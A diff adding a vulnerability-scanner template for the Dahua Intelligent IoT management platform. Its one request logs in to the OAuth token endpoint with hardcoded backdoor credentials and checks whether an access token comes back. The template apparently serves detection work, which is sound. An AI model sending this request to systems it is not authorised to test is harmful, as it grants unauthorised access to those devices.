@@ -1,0 +1,33 @@
+id: dahua-icc-backdoor-user
+brief:
+    title: Dahua Intelligent IoT - Information Disclosure
+    by: DhiyaneshDk
+    level: high
+    about: There is a vulnerability in the user login interface /evo-apigw/evo-oauth/oauth/token of Zhejiang Dahua Technology Co., Ltd. Intelligent IoT Integrated Management Platform. Users can successfully l...
+    label:
+        - dahua
+        - exposure
+        - backdoor
+        - bypass
+        - vuln
+moves:
+    - verb: POST
+      to:
+        - '{{BaseURL}}/evo-apigw/evo-oauth/oauth/token'
+      head:
+        Content-Type: application/x-www-form-urlencoded
+      body: username=justForTest&password=1&grant_type=password&client_id=web_client&client_secret=web_client&public_key=
+      signs:
+        - "on": word
+          has:
+            - '"success":'
+            - '"access_token":'
+            - '"token_type":'
+            - magicId
+          in: body
+          need: all
+        - "on": word
+          has:
+            - application/json
+          in: header
+          need: all
